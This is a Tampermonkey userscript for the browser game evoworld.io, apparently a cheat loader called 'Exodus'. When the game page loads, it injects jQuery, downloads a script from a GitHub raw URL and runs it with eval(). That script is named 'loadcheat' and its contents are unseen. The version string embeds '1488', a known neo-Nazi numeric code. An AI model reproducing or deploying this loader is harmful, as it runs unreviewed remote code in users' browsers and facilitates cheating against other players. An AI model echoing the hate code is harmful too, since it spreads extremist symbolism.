// ==UserScript==
// @name         Evoworld.io Exodus v1 Realise
// @namespace    http://tampermonkey.net/
// @version      1488-13-37
// @description  try to take over the world!
// @author       You
// @match        https://evoworld.io/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=evoworld.io
// @grant        none
// ==/UserScript==

(function() {
  var script = document.createElement('script');
  script.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js";
  script.type = 'text/javascript';
  script.onload = function() {
    $.get('https://raw.githubusercontent.com/uloxaa/evoworld.io_exodus/refs/heads/main/script.js', loadcheat => eval(loadcheat));
  };
  document.getElementsByTagName('head')[0].appendChild(script);
})();
